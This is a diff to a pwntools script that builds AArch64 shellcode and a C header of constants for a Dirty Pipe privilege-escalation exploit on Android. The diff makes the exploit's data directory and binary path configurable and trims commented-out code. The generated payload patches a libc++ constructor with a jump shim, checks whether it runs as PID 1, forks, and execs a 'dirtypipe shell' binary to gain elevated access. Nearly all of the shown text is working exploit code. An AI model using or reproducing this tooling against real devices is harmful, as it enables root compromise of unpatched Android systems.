@@ -1,4 +1,5 @@
 from pwn import *
+import sys
 
 context.arch = 'aarch64'
 
@@ -43,6 +44,16 @@ str x0, [sp, #8]
     return out
 
 def main():
+    if len(sys.argv) != 1 and len(sys.argv) != 3:
+        print('Usage: gen_constants.py <exploit_data_dir> <dirtypipe_binary>')
+        sys.exit(1)
+    elif len(sys.argv) == 3:
+        exploit_data_dir = sys.argv[1]
+        binary_path = sys.argv[2]
+    else:
+        exploit_data_dir = '/data/local/tmp'
+        binary_path = '/data/local/tmp/dirtypipe'
+
     jmp_shim = asm(f'b {UNUSED_CODE_START - streambuff_ctor}', vma = streambuff_ctor)
     assert len(jmp_shim) == 4
     old_instr_bytes = libcpp.read(streambuff_ctor, 4)
@@ -63,26 +74,6 @@ def main():
     svc #0
     cmp x0, #1            // is PID == 1?
     b.ne exit             // if not, exit
-
-    // getresuid syscall
-    //sub sp, sp, #32
-    //add x0, sp, #0
-    //add x1, sp, #8
-    //add x2, sp, #16
-    //mov x8, #148
-    //svc #0
-
-    //ldr x0, [sp, #0]
-    //ldr x1, [sp, #8]
-    //ldr x2, [sp, #16]
-    //cmp x0, #0
-    //b.eq go
-    //cmp x1, #0
-    //b.eq go
-    //cmp x2, #0
-    //b.eq go
-
-    //b #0x69690
 
     // Set up arguments for clone()
     // x86_64
@@ -105,13 +96,7 @@ def main():
     b.lt exit             // error
     b.gt exit             // parent process exits
 
-//loop:
-    //b loop
-
-    // execve("/data/local/tmp/dirtypipe", ["dirtypipe", "shell"], NULL)
-
-//go:
-    {push_str_on_stack('/data/local/tmp/pwn')}
+    {push_str_on_stack(f'{exploit_data_dir}/pwn')}
     // Arguments for openat:
     // int openat(int dirfd, const char *pathname, int flags, mode_t mode)
     // x0 = dirfd (AT_FDCWD = -100)
@@ -135,7 +120,8 @@ def main():
     mov x8, #56
     //svc #0
 
-    {push_str_on_stack('/data/local/tmp/dirtypipe')}
+    // execve("/data/local/tmp/dirtypipe", ["dirtypipe", "shell"], NULL)
+    {push_str_on_stack(binary_path)}
     mov x6, sp
 
     {push_str_on_stack('shell')}
@@ -197,6 +183,8 @@ unsigned char PAYLOAD[] = {bytes_to_c_array(payload)};
 // just for testing
 size_t TEXT_SEGMENT_OFFSET = {hex(TEXT_SEGMENT_OFFSET)};
 unsigned char TEXT_SEGMENT_PAYLOAD[] = {bytes_to_c_array(p64(new_text_size) + p64(new_text_size))};
+
+#define EXPLOIT_DATA_DIR "{exploit_data_dir}"
 
 #endif
 '''
